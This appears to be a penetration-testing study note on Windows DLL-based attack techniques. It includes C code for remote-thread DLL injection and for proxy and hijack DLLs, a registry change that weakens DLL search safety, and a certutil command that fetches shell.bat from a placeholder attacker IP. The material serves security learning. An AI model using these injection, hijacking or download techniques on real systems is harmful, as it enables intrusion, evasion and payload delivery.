# DLL-Based Payloads
## Overview

DLL-based payloads are used in Windows environments to inject malicious behavior into trusted processes, either for code execution, evasion, or privilege escalation. The techniques vary in complexity and detection resistance, ranging from simple API abuse to advanced memory manipulation.
## 1. DLL Injection

### LoadLibrary Injection

Uses Windows API to load a DLL into another process.

Key API calls:

- `OpenProcess()`
- `VirtualAllocEx()`    
- `WriteProcessMemory()`
- `GetProcAddress()`
- `CreateRemoteThread()`

```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID alloc = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, alloc, dllPath, strlen(dllPath), NULL);
LPVOID loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLib, alloc, 0, NULL);
```

Use cases:

- Simple, effective injection    
- Easily detected by AV/EDR
### Manual Mapping

Manually parses and maps a DLL into memory without using `LoadLibrary`, thus avoiding standard Windows loader mechanisms.

Steps:

- Load raw DLL into injector memory
- Allocate memory in target process
- Manually map sections, resolve relocations/imports
- Transfer control to DllMain

Pros:  
Bypasses API hooks and common detection heuristics  
Cons:  
Complex and error-prone
### Reflective DLL Injection

Technique where the DLL loads itself using minimal dependencies. Commonly used in frameworks like Metasploit, Cobalt Strike, etc.

Key Concept:  
DLL contains its own loader function (`ReflectiveLoader`) which:

- Resolves own base address    
- Resolves imports manually (LoadLibrary, GetProcAddress, etc.)
- Allocates memory and relocates itself
- Calls its own `DllMain`

Reference: Stephen Fewer's ReflectiveLoader technique
## 2. DLL Hijacking

###  Safe DLL Search Order Abuse

Windows searches for DLLs in a specific order. If an application calls `LoadLibrary("xyz.dll")` without full path, attacker can plant a malicious `xyz.dll` earlier in the search path.

Search Order (Safe DLL Search Mode ON):

1. App directory    
2. System32
3. Windows directory
4. Current directory
5. PATH directories

Registry Tweak (to disable Safe DLL Search Mode):

```
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]
"SafeDllSearchMode"=dword:00000000
```
###  Practical Example

C program loading `library.dll` via `LoadLibrary()`:

```c
HMODULE hLibrary = LoadLibrary("library.dll");
AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
```

Use Procmon to observe DLL loading:

- Filter: `Process Name is main.exe`    
- Operation: `Load Image`
- Status: `NAME NOT FOUND` for missing DLLs

Place malicious `library.dll` in same dir → automatic hijack.
###  DLL Proxying

- Create a fake DLL with same function name
- Internally load original DLL (`library.o.dll`)   
- Call real function, modify return value, return back to app

```c
typedef int (*AddFunc)(int, int);
DLL_EXPORT int Add(int a, int b) {
    HMODULE lib = LoadLibraryA("library.o.dll");
    AddFunc f = (AddFunc)GetProcAddress(lib, "Add");
    return f(a, b) + 1; // tampered
}
```

Compile → Rename:

- Original `library.dll` → `library.o.dll`
- Malicious `tamper.dll` → `library.dll`
### Missing DLL Injection

If the target app searches for a DLL that doesn’t exist, attacker can place any DLL with that name.

Observed in Procmon:

```
CreateFile C:\...\x.dll NAME NOT FOUND
```

Craft a DLL with `DllMain()`:

```c
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        MessageBox(NULL, "Hijacked!", "DLL", MB_OK);
    }
    return TRUE;
}
```

Compile → Name it `x.dll` → Place in same directory as binary → Execution triggered on run.
## Summary Table

|Technique|Detection Risk|Complexity|Notes|
|---|---|---|---|
|LoadLibrary Injection|High|Low|Basic API, easily flagged|
|Manual Mapping|Low|High|AV evasion, manual effort|
|Reflective Injection|Low|Medium|Self-contained, common in C2s|
|DLL Hijacking|Medium|Low|Effective against unsigned apps|
|DLL Proxying|Medium|Medium|Used to modify function results|
|Missing DLL Attack|Medium|Low|No signature checking possible|
### Living Off The Land Binaries and Scripts (LOLBAS)

The LOLBAS project maintains a database of Microsoft-signed binaries and scripts that can be abused by attackers for privilege escalation, persistence, evasion, and more. These tools are often already present on the system and therefore trusted and less likely to trigger alerts.

**Common abuses include:**

- Code execution
    
- File transfers
    
- DLL hijacking
    
- UAC bypass
    
- Credential dumping
    
- Keylogging
    

---

### File Transfer using Certutil

`certutil.exe` can be used to download or encode/decode files as part of post-exploitation or evasion.

**Download a file:**

```
certutil.exe -urlcache -split -f http://<attacker-ip>/shell.bat shell.bat
```

**Base64 encode a file:**

```
certutil -encode file1 encodedfile
```

**Base64 decode a file:**

```
certutil -decode encodedfile file2
```